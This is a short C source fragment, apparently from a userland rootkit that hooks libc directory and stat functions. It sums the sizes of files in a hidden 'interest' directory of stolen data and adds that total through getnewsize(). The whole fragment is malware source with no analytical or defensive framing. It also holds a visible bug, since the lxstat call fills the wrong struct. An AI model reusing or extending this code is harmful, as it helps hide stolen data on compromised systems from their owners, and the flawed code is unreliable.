off_t getstolensize(void){
    off_t ret=0;
    DIR *dp;
    struct dirent *dir;
    struct stat sbuf, lsbuf;

    hook(COPENDIR, CREADDIR, C__XSTAT, C__LXSTAT);

    dp = call(COPENDIR, INTEREST_DIR);
    if(dp == NULL) return 0;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char path[LEN_INTEREST_DIR+strlen(dir->d_name)+2];
        snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
        memset(&sbuf, 0, sizeof(struct stat));
        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
            continue;

        memset(&lsbuf, 0, sizeof(struct stat));
        if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0)
            continue;

        if(S_ISLNK(lsbuf.st_mode))
            ret = ret+lsbuf.st_size;
        else
            ret = ret+sbuf.st_size;
    }
    closedir(dp);

    return ret;
}

off_t getnewsize(off_t fsize){
    return getstolensize()+fsize;
}